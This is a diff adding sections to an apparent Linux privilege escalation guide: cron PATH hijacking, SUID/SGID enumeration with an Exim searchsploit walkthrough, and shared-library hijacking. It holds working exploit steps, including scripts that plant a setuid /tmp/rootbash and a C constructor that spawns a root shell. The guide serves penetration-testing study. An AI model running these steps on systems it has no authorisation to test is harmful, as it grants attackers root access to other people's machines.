@@ -1,3 +1,4 @@
+
 # Linux Privilege Escalation
 
 {% hint style="success" %}
@@ -608,6 +609,35 @@ If the script executed by root uses a **directory where you have full access**, 
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
+
+### The crontab PATH environment variable
+
+1. **Crontab PATH**  
+   If a cron job doesn't use an absolute path and a directory in the `PATH` variable is writable, you can place a malicious script in that directory to escalate privileges.
+
+2. **Check Crontab**  
+   View the system crontab:
+   ```bash
+   $ cat /etc/crontab
+   ```
+   Example:
+   ```
+   PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+   * * * * * root overwrite.sh
+   ```
+
+3. **Create Exploit Script**  
+   In the writable directory (`/home/user`):
+   ```bash
+   $ echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /home/user/overwrite.sh
+   $ chmod +x /home/user/overwrite.sh
+   ```
+
+4. **Gain Root**  
+   Wait for the cron job, then execute the setuid `rootbash` shell:
+   ```bash
+   $ /tmp/rootbash -p
+   ```
 
 ### Frequent cron jobs
 
@@ -1234,6 +1264,75 @@ sudo LD_LIBRARY_PATH=. apache2
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+## SUID/SGID
+
+- **SUID**: Runs with file owner’s privileges.
+- **SGID**: Runs with file group’s privileges.
+- **Root-owned** SUID/SGID files can be used for privilege escalation.
+
+---
+
+### Finding SUID/SGID Files
+
+```bash
+find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+```
+
+---
+
+### Shell Escape Sequences
+
+Use **GTFOBins** for programs that support escape sequences:  
+- [https://gtfobins.github.io/](https://gtfobins.github.io/)
+
+---
+
+### LD_PRELOAD & LD_LIBRARY_PATH
+
+- **Disabled** for SUID files due to security.
+
+---
+
+### Known Exploits for SUID/SGID Files
+
+- **SUID files** can be exploited like services running as root.  
+- Use **Searchsploit**, **Google**, or **GitHub** to find exploits.
+
+ example:
+
+1. **Find SUID/SGID files**:
+   ```bash
+   find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+   Example: `/usr/sbin/exim-4.84-3`
+
+2. **Confirm version**:
+   ```bash
+   /usr/sbin/exim-4.84-3 --version
+   ```
+
+3. **Search for an exploit**:
+   ```bash
+   searchsploit exim 4.84
+   ```
+
+4. **Copy and clean up exploit**:
+   ```bash
+   sed -e "s/^M//" 39535.sh > privesc.sh
+   ```
+
+5. **Make script executable**:
+   ```bash
+   chmod +x privesc.sh
+   ```
+
+6. **Run exploit**:
+   ```bash
+   ./privesc.sh
+   ```
+
+---
+
 ### SUID Binary – .so injection
 
 When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files properly. This can be checked by running the following command:
@@ -1268,6 +1367,46 @@ gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 Finally, running the affected SUID binary should trigger the exploit, allowing for potential system compromise.
 
 ## Shared Object Hijacking
+- ***method 1 ( overwrite  missed libs )*** 
+
+1. **Find SUID/SGID files:**
+   ```bash
+   find / -type f \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+   ```
+   Example: `/usr/local/bin/suid-so`
+
+2. **Analyze SUID binary with `strace`:**
+   ```bash
+   strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+   ```
+   > The libcalc.so shared object could not be found, and the program is looking in our user’s home directory, which we can write to.
+
+3. **Exploit by creating a malicious shared library:**
+   - Create the `.config` directory:
+     ```bash
+     mkdir -p /home/user/.config
+     ```
+   - Write the exploit code (`libcalc.c`):
+     ```c
+     #include <stdio.h>
+     #include <stdlib.h>
+
+     static void inject() __attribute__((constructor));
+
+     void inject() {
+         setuid(0);
+         system("/bin/bash -p");
+     }
+     ```
+
+4. **Compile and execute:**
+   ```bash
+   gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
+   /usr/local/bin/suid-so
+   ```
+   This gives a root shell.
+
+- ***method 2 (overwrite existing libs ) *** :
 
 ```bash
 # Lets find a SUID using a non-standard library
